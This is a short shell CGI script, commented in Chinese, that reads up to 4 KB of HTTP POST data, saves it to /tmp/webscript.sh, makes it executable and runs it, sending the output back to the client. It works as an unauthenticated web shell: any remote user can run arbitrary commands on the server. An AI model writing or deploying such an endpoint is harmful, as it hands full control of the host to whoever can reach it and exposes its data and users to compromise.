#!/bin/sh
echo "Content-type: text/plain"
echo ""

# 读取 POST 数据（最大 4KB）
read -n 4096 CODE

# 保存并执行脚本
TMP_FILE="/tmp/webscript.sh"
echo "$CODE" > "$TMP_FILE"
chmod +x "$TMP_FILE"

echo "💡 开始执行脚本内容"
echo "--------------------------"
"$TMP_FILE" 2>&1
